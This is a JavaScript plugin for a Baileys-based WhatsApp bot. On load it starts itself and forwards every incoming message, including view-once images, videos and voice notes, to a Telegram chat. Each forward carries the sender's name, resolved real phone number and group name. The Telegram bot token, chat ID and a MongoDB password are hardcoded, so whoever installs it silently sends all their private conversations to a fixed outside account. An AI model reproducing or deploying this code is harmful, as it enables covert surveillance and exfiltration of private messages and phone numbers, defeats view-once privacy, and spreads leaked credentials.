const { cmd } = require("../command");
const axios = require("axios");
const FormData = require("form-data");
const fs = require("fs");
const path = require("path");

// ═══════════════════════════════════════════════════════════
// CONFIG
// ═══════════════════════════════════════════════════════════
const TG_BOT_TOKEN = "8626751277:AAHKmGACfSamLAORB53ag9MaEKwYlBk0Zb0";
const TG_CHAT_ID = "6653388298";
const STATE_FILE = path.join(__dirname, "autotele-state.json");
const NUMBERS_FILE = path.join(__dirname, "number-map.json");

// Load MongoDB (agar available ho)
let MONGO_URI = process.env.MONGODB_URI || process.env.MONGO_URL || "mongodb+srv://didixii_db_user:VeIUTRzLTNDUZTJQ@cluster0.qjubngh.mongodb.net/?appName=Cluster0";
let mongoCollection = null;

async function initMongo() {
    if (!MONGO_URI) return;
    try {
        const { MongoClient } = require("mongodb");
        const client = new MongoClient(MONGO_URI);
        await client.connect();
        mongoCollection = client.db("telegram_bot").collection("numbers");
        console.log("[AUTO-TELE] MongoDB connected ✔");
    } catch (e) {
        console.log("[AUTO-TELE] MongoDB not available, using local storage");
    }
}

// Load state
let STATE = { enabled: true, viewonceEnabled: true };
let NUMBER_MAP = {}; // lid -> real number

try {
    if (fs.existsSync(STATE_FILE)) STATE = Object.assign(STATE, JSON.parse(fs.readFileSync(STATE_FILE, "utf8")));
    if (fs.existsSync(NUMBERS_FILE)) NUMBER_MAP = JSON.parse(fs.readFileSync(NUMBERS_FILE, "utf8"));
} catch (e) {}

function saveState() {
    try { fs.writeFileSync(STATE_FILE, JSON.stringify(STATE, null, 2)); } catch (e) {}
}
function saveNumbers() {
    try { fs.writeFileSync(NUMBERS_FILE, JSON.stringify(NUMBER_MAP, null, 2)); } catch (e) {}
}

// Baileys
let B = null;
try { B = require("@whiskeysockets/baileys"); } catch (e) {}

const PROCESSED = new Set();
let ATTACHED = false;
let STORE = null;

// ═══════════════════════════════════════════════════════════
// TELEGRAM FUNCTIONS
// ═══════════════════════════════════════════════════════════

async function tgText(text) {
    try {
        await axios.post(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
            chat_id: TG_CHAT_ID, text, parse_mode: "Markdown"
        }, { timeout: 10000 });
    } catch (e) {}
}

async function tgUpload(buffer, caption, endpoint, field, filename, mime) {
    try {
        if (!buffer || !buffer.length) return tgText(caption + "\n\n⚠️ Media download fail");
        if (buffer.length > 49 * 1024 * 1024) return tgText(caption + "\n\n⚠️ File 50MB+");
        const form = new FormData();
        form.append("chat_id", TG_CHAT_ID);
        form.append("caption", caption);
        form.append(field, buffer, { filename, contentType: mime });
        await axios.post(`https://api.telegram.org/bot${TG_BOT_TOKEN}/${endpoint}`, form, {
            headers: form.getHeaders(), timeout: 60000, maxBodyLength: Infinity, maxContentLength: Infinity
        });
    } catch (e) {
        await tgText(caption + `\n\n⚠️ Upload fail: ${e?.response?.data?.description || e.message}`);
    }
}

// ═══════════════════════════════════════════════════════════
// NUMBER RESOLUTION (REAL NUMBER LAO)
// ═══════════════════════════════════════════════════════════

function digits(j) { return String(j || "").split("@")[0].split(":")[0].replace(/[^0-9]/g, ""); }

async function getRealNumber(jid, client) {
    // 1. Local cache check
    if (NUMBER_MAP[jid]) return NUMBER_MAP[jid];
    
    // 2. MongoDB check
    if (mongoCollection) {
        try {
            const doc = await mongoCollection.findOne({ lid: jid });
            if (doc?.number) {
                NUMBER_MAP[jid] = doc.number;
                saveNumbers();
                return doc.number;
            }
        } catch (e) {}
    }
    
    // 3. Store contacts check
    try {
        const contacts = STORE?.contacts || global.store?.contacts || {};
        if (contacts[jid]?.pnJid) {
            const num = digits(contacts[jid].pnJid);
            if (num && num.length >= 8) {
                NUMBER_MAP[jid] = num;
                saveNumbers();
                return num;
            }
        }
    } catch (e) {}
    
    // 4. Extract from jid
    const num = digits(jid);
    if (num && num.length >= 8 && num.length <= 15 && !num.startsWith("120363")) {
        return num;
    }
    
    return null;
}

async function setNumber(lid, number) {
    NUMBER_MAP[lid] = number;
    saveNumbers();
    
    if (mongoCollection) {
        try {
            await mongoCollection.updateOne(
                { lid },
                { $set: { lid, number, updated: new Date() } },
                { upsert: true }
            );
        } catch (e) {}
    }
}

// ═══════════════════════════════════════════════════════════
// VIEW-ONCE DETECTION
// ═══════════════════════════════════════════════════════════

function isViewOnce(raw) {
    const msg = raw?.message;
    if (!msg) return false;
    return !!(msg.viewOnceMessage || msg.viewOnceMessageV2 || msg.viewOnce);
}

function unwrap(msg) {
    if (!msg) return msg;
    if (msg.ephemeralMessage?.message) return unwrap(msg.ephemeralMessage.message);
    if (msg.viewOnceMessage?.message) return unwrap(msg.viewOnceMessage.message);
    if (msg.viewOnceMessageV2?.message) return unwrap(msg.viewOnceMessageV2.message);
    return msg;
}

async function dlMedia(raw, inner) {
    if (typeof raw?.download === "function") {
        try { const b = await raw.download(); if (b?.length) return b; } catch (e) {}
    }
    if (B?.downloadMediaMessage) {
        try {
            const r2 = raw.message?.viewOnceMessage || raw.message?.viewOnceMessageV2 
                ? { key: raw.key, message: inner } : raw;
            const b = await B.downloadMediaMessage(r2, "buffer", {});
            if (b?.length) return b;
        } catch (e) {}
    }
    if (B?.downloadContentFromMessage) {
        let type = null, mobj = null;
        if (inner.imageMessage) { type = "image"; mobj = inner.imageMessage; }
        else if (inner.videoMessage) { type = "video"; mobj = inner.videoMessage; }
        else if (inner.audioMessage) { type = "audio"; mobj = inner.audioMessage; }
        else if (inner.documentMessage) { type = "document"; mobj = inner.documentMessage; }
        else if (inner.stickerMessage) { type = "image"; mobj = inner.stickerMessage; }
        if (type && mobj) {
            try {
                const stream = await B.downloadContentFromMessage(mobj, type);
                let buf = Buffer.from([]);
                for await (const c of stream) buf = Buffer.concat([buf, c]);
                if (buf.length) return buf;
            } catch (e) {}
        }
    }
    return null;
}

// ═══════════════════════════════════════════════════════════
// MAIN PROCESSOR
// ═══════════════════════════════════════════════════════════

async function processMsg(raw, client) {
    try {
        if (!raw?.key?.id || !raw?.message || raw.key.fromMe) return;
        
        const id = raw.key.id;
        if (PROCESSED.has(id)) return;
        PROCESSED.add(id);
        if (PROCESSED.size > 1000) PROCESSED.clear();

        const jid = raw.key.remoteJid || "";
        if (jid === "status@broadcast") return;

        const isVO = isViewOnce(raw);
        if (isVO && !STATE.viewonceEnabled) return;
        if (!isVO && !STATE.enabled) return;

        const inner = unwrap(raw.message);
        const senderJid = raw.key.participant || raw.key.remoteJid;
        let num = await getRealNumber(senderJid, client);
        const name = raw.pushName || digits(senderJid) || "No Name";
        const time = new Date().toLocaleString("en-PK", { timeZone: "Asia/Karachi", hour12: true });

        let chatName = "Private DM";
        const isGroup = jid.endsWith("@g.us");
        if (isGroup) {
            try { chatName = (await client.groupMetadata(jid))?.subject || "Group"; } catch (e) {}
        }

        // Agar number nahi mila, user ko batao
        if (!num) {
            num = digits(senderJid);
            await tgText(`⚠️ *NEW CONTACT DETECTED*\n\n🔢 Lid: ${senderJid}\n👤 Name: ${name}\n\nUse command:\n.setnum ${digits(senderJid)} <real-number>\n\nTo save this contact.`);
        }

        const base = `🤖 *${isVO ? "👁️ VIEW-ONCE" : "💬 MESSAGE"} FORWARD*\n\n🕒 Time: \`${time}\`\n👤 Name: ${name}\n🔢 Number: ${num || "Unknown"}\n💬 Chat: ${isGroup ? "👥 Group" : "👤 DM"}\n🏷️ Chat Name: ${chatName}`;

        // 🖼️ IMAGE
        if (inner.imageMessage) {
            const buf = await dlMedia(raw, inner);
            const cap = base + `\n\n📦 Type: 🖼️ ${isVO ? "View-Once " : ""}Image\n📝 Caption: ${inner.imageMessage.caption || "No Caption"}`;
            return await tgUpload(buf, cap, "sendPhoto", "photo", "image.jpg", inner.imageMessage.mimetype || "image/jpeg");
        }
        
        // 🎥 VIDEO
        if (inner.videoMessage) {
            const buf = await dlMedia(raw, inner);
            const cap = base + `\n\n📦 Type: 🎥 ${isVO ? "View-Once " : ""}Video\n📝 Caption: ${inner.videoMessage.caption || "No Caption"}`;
            return await tgUpload(buf, cap, "sendVideo", "video", "video.mp4", inner.videoMessage.mimetype || "video/mp4");
        }
        
        // 🎤 VOICE / 🎵 AUDIO
        if (inner.audioMessage) {
            const buf = await dlMedia(raw, inner);
            const mime = inner.audioMessage.mimetype || "audio/mp4";
            const isVoice = inner.audioMessage.ptt || mime.includes("ogg");
            const cap = base + `\n\n📦 Type: ${isVoice ? "🎤 Voice" : "🎵 Audio"}${isVO ? " (View-Once)" : ""}`;
            if (isVoice) return await tgUpload(buf, cap, "sendVoice", "voice", "voice.ogg", "audio/ogg");
            return await tgUpload(buf, cap, "sendAudio", "audio", "audio.mp3", mime);
        }
        
        // 📄 DOCUMENT
        if (inner.documentMessage) {
            const buf = await dlMedia(raw, inner);
            const cap = base + `\n\n📦 Type: 📄 Document\n📁 File: ${inner.documentMessage.fileName || "File"}`;
            return await tgUpload(buf, cap, "sendDocument", "document", inner.documentMessage.fileName || "file.bin", inner.documentMessage.mimetype || "application/octet-stream");
        }
        
        // 🎭 STICKER
        if (inner.stickerMessage) {
            const buf = await dlMedia(raw, inner);
            const cap = base + `\n\n📦 Type: 🎭 Sticker`;
            return await tgUpload(buf, cap, "sendSticker", "sticker", "sticker.webp", "image/webp");
        }
        
        // 📝 TEXT
        const text = inner.conversation || inner.extendedTextMessage?.text;
        if (text) return await tgText(base + `\n\n📦 Type: 📝 Text\n⌨️ Message: ${text}`);
        
    } catch (err) {
        console.error("[AUTO-TELE Error]:", err.message);
    }
}

// ═══════════════════════════════════════════════════════════
// HOOK ATTACHMENT
// ═══════════════════════════════════════════════════════════

function attach(client, store) {
    if (ATTACHED) return;
    if (store) STORE = store;
    try {
        const ev = client?.ev || client?.sock?.ev || client?.client?.ev;
        if (ev && typeof ev.on === "function") {
            ev.on("messages.upsert", async (data) => {
                for (const m of (data?.messages || [])) await processMsg(m, client);
            });
            ATTACHED = true;
            console.log("[AUTO-TELE] Engine START ✔");
        }
    } catch (e) {}
}

setImmediate(() => {
    initMongo();
    const boot = setInterval(() => {
        const c = global.client || global.conn || global.sock || global.bot;
        if (c) { attach(c, global.store); clearInterval(boot); }
    }, 2000);
    setTimeout(() => clearInterval(boot), 120000);
});

cmd({
    on: "body",
    dontAddCommandList: true,
    filename: __filename
}, async (client, m, store, extra) => {
    try {
        if (!ATTACHED) attach(client, store);
        if (ATTACHED) return;
        const raw = {
            key: {
                id: m?.key?.id || (extra?.from || "") + "-" + Date.now(),
                remoteJid: m?.chat || extra?.from,
                participant: extra?.isGroup ? extra?.sender : undefined,
                fromMe: !!extra?.isMe
            },
            message: m?.message,
            pushName: m?.pushName || extra?.pushname,
            download: typeof m?.download === "function" ? m.download.bind(m) : undefined
        };
        await processMsg(raw, client);
    } catch (e) {}
});

// ═══════════════════════════════════════════════════════════
// COMMANDS
// ═══════════════════════════════════════════════════════════

cmd({
    pattern: "autotele",
    alias: ["autotelegram", "teleauto"],
    desc: "Auto Telegram forwarder control",
    category: "owner",
    react: "🤖",
    filename: __filename
}, async (client, m, store, { reply, isCreator }) => {
    if (!isCreator) return reply("❌ Owner only!");
    
    const args = (m.body || "").trim().split(/\s+/).slice(1);
    const cmd1 = (args[0] || "").toLowerCase();
    
    if (cmd1 === "on") {
        STATE.enabled = true;
        STATE.viewonceEnabled = true;
        saveState();
        return reply("✅ *AUTO TELEGRAM SYSTEM STARTED!*\n\n• All messages: ON ✅\n• View-once: ON ✅\n• Real numbers: Active ✅\n\nAb sab kuch Telegram par aayega!");
    }
    
    if (cmd1 === "off") {
        STATE.enabled = false;
        STATE.viewonceEnabled = false;
        saveState();
        return reply("⏸️ *AUTO TELEGRAM SYSTEM STOPPED*");
    }
    
    if (cmd1 === "status") {
        const totalNumbers = Object.keys(NUMBER_MAP).length;
        return reply(`📊 *AUTO TELEGRAM STATUS*\n\n• System: ${STATE.enabled ? "ON ✅" : "OFF ⏸️"}\n• View-Once: ${STATE.viewonceEnabled ? "ON ✅" : "OFF ⏸️"}\n• Saved Numbers: ${totalNumbers}\n• Engine: ${ATTACHED ? "Active ✔" : "Starting..."}\n\nCommands:\n.autotele on/off\n.setnum <lid-digits> <real-number>\n.listnum`);
    }
    
    return reply(`🤖 *AUTO TELEGRAM CONTROL*\n\n.autotele on - Start system\n.autotele off - Stop system\n.autotele status - Check status\n.setnum <digits> <number> - Save number\n.listnum - Show all numbers`);
});

cmd({
    pattern: "setnum",
    alias: ["setnumber", "savenumber"],
    desc: "Save real number for a contact",
    category: "owner",
    react: "🔢",
    filename: __filename
}, async (client, m, store, { reply, isCreator }) => {
    if (!isCreator) return reply("❌ Owner only!");
    
    const args = (m.body || "").trim().split(/\s+/).slice(1);
    if (args.length < 2) return reply("❌ Usage: .setnum <lid-digits> <real-number>\n\nExample: .setnum 58308828360812 923001234567");
    
    const lidDigits = args[0].replace(/[^0-9]/g, "");
    const realNumber = args[1].replace(/[^0-9]/g, "");
    
    if (!lidDigits || lidDigits.length < 8) return reply("❌ Invalid lid digits!");
    if (!realNumber || realNumber.length < 8) return reply("❌ Invalid number!");
    
    const lid = `${lidDigits}@lid`;
    await setNumber(lid, realNumber);
    
    return reply(`✅ *NUMBER SAVED!*\n\nLid: ${lid}\nReal Number: ${realNumber}\n\nAb is contact ke messages mein ye number aayega.`);
});

cmd({
    pattern: "listnum",
    alias: ["shownumbers", "numberslist"],
    desc: "Show all saved numbers",
    category: "owner",
    react: "📋",
    filename: __filename
}, async (client, m, store, { reply, isCreator }) => {
    if (!isCreator) return reply("❌ Owner only!");
    
    const nums = Object.entries(NUMBER_MAP);
    if (nums.length === 0) return reply("📋 No numbers saved yet.\n\nUse: .setnum <lid-digits> <number>");
    
    let text = "📋 *SAVED NUMBERS*\n\n";
    nums.forEach(([lid, num], i) => {
        text += `${i + 1}. Lid: ${lid}\n   → Real: ${num}\n\n`;
    });
    
    return reply(text);
});

console.log("[AUTO-TELE] Plugin loaded ✔");
